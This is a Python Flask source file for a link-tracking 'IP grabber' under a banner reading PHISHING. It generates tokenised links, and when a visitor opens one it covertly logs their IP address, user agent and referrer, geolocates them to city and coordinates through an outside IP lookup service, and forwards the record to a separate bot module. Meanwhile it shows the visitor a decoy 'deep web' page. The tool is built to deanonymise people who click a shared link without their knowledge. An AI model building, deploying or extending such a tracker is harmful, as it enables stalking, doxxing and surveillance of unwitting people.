from flask import Flask, request
import requests
import random
import string
import time
import os

app = Flask(__name__)

BANNER = """
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░
██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
"""

tracking_data = {}
active_tokens = set()

def generate_token():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(15))

def get_ip_info(ip):
    try:
        if ip not in ['127.0.0.1', 'localhost']:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = response.json()
            return data
        return {}
    except:
        return {}

def start_bot(info):
    try:
        from bot import send_info
        send_info(info)
    except Exception as e:
        print(f"Bot error: {e}")

@app.route('/')
def index():
    token = generate_token()
    active_tokens.add(token)
    tracking_data[token] = None
    
    html_content = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Onion Web Tracker</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background: #000;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                overflow-x: hidden;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                text-align: center;
                padding: 30px;
                border: 2px solid #00ff00;
                border-radius: 10px;
                background: rgba(0, 255, 0, 0.05);
                max-width: 800px;
                width: 90%;
            }
            .banner {
                font-size: 24px;
                margin-bottom: 30px;
                text-shadow: 0 0 10px #00ff00;
            }
            .url-box {
                background: #111;
                padding: 20px;
                border: 1px solid #00ff00;
                margin: 20px 0;
                word-break: break-all;
                font-size: 18px;
            }
            .info {
                color: #888;
                margin-top: 20px;
                font-size: 14px;
            }
            .pulse {
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.7; }
                100% { opacity: 1; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="banner pulse">ONION WEB TRACKER</div>
            <div>Ваша отслеживаемая ссылка:</div>
            <div class="url-box" id="url">""" + f"https://onion-web.onrender.com/{token}" + """</div>
            <div class="info">Ссылка активна в течение 24 часов</div>
            <div class="info">Все переходы будут отслеживаться и логироваться</div>
        </div>
        
        <script>
            setTimeout(() => {
                document.querySelector('.pulse').style.animation = 'none';
            }, 5000);
        </script>
    </body>
    </html>
    """
    
    return html_content

@app.route('/<token>')
def track_visit(token):
    if token not in active_tokens:
        return """
        <html>
            <head>
                <style>
                    body { background: #000; color: #ff0000; font-family: monospace; text-align: center; padding: 50px; }
                </style>
            </head>
            <body>
                <h1>404 - Link Expired</h1>
                <p>This tracking link has expired or is invalid.</p>
                <p><a href="/" style="color: #00ff00;">Get new link</a></p>
            </body>
        </html>
        """, 404
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0].strip()
    
    ip_info = get_ip_info(ip)
    
    info = {
        'ip': ip,
        'port': request.environ.get('REMOTE_PORT', 'N/A'),
        'user_agent': user_agent,
        'referrer': referrer,
        'country': ip_info.get('country', 'N/A'),
        'city': ip_info.get('city', 'N/A'),
        'lon': ip_info.get('lon', 'N/A'),
        'lat': ip_info.get('lat', 'N/A'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    
    tracking_data[token] = info
    
    print(f"🔗 Tracked visit: {ip} - {token}")
    
    try:
        with open('onion.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
        return html_content
    except:
        return """
        <html>
            <head>
                <title>Onion Space</title>
                <style>
                    body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 50px; }
                </style>
            </head>
            <body>
                <h1>Onion Space</h1>
                <p>Welcome to the deep web...</p>
            </body>
        </html>
        """

@app.route('/health')
def health():
    return {
        'status': 'healthy',
        'active_tokens': len(active_tokens),
        'tracked_visits': len([t for t in tracking_data.values() if t]),
        'timestamp': time.time()
    }

@app.route('/admin')
def admin():
    stats = {
        'active_tokens': len(active_tokens),
        'total_tracked': len([t for t in tracking_data.values() if t]),
        'uptime': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    
    return f"""
    <html>
        <head>
            <title>Admin Panel</title>
            <style>
                body {{ background: #000; color: #00ff00; font-family: monospace; padding: 20px; }}
                .stat {{ margin: 10px 0; padding: 10px; border: 1px solid #00ff00; }}
            </style>
        </head>
        <body>
            <h1>🔧 Admin Panel</h1>
            <div class="stat">🟢 Active tokens: {stats['active_tokens']}</div>
            <div class="stat">📊 Total tracked: {stats['total_tracked']}</div>
            <div class="stat">⏰ Uptime: {stats['uptime']}</div>
            <br>
            <a href="/" style="color: #00ff00;">↩ Back to generator</a>
        </body>
    </html>
    """

def monitor_tracking():
    while True:
        try:
            for token in list(active_tokens):
                if tracking_data.get(token):
                    info = tracking_data[token]
                    print(f"""
🎯 New Visit Detected!

📊 Network Info:
├ IP: {info['ip']}
├ User Agent: {info['user_agent'][:100]}...
├ Referrer: {info['referrer']}
├ Time: {info['timestamp']}

📍 Location:
├ Country: {info['country']}
├ City: {info['city']}
├ Coordinates: {info['lat']}, {info['lon']}
""")
                    start_bot(info)
                    del tracking_data[token]
            
            time.sleep(2)
        except Exception as e:
            print(f"Monitor error: {e}")
            time.sleep(5)

def cleanup_tokens():
    while True:
        time.sleep(3600)
        try:
            if len(active_tokens) > 50:
                tokens_to_remove = list(active_tokens)[:25]
                for token in tokens_to_remove:
                    active_tokens.discard(token)
                    if token in tracking_data:
                        del tracking_data[token]
                print(f"🧹 Cleaned {len(tokens_to_remove)} old tokens")
        except Exception as e:
            print(f"Cleanup error: {e}")

if __name__ == "__main__":
    print(BANNER)
    
    import threading
    monitor_thread = threading.Thread(target=monitor_tracking)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    cleanup_thread = threading.Thread(target=cleanup_tokens)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting server on port {port}")
    print("🌐 Available at: https://onion-web.onrender.com")
    
    app.run(host='0.0.0.0', port=port, debug=False)
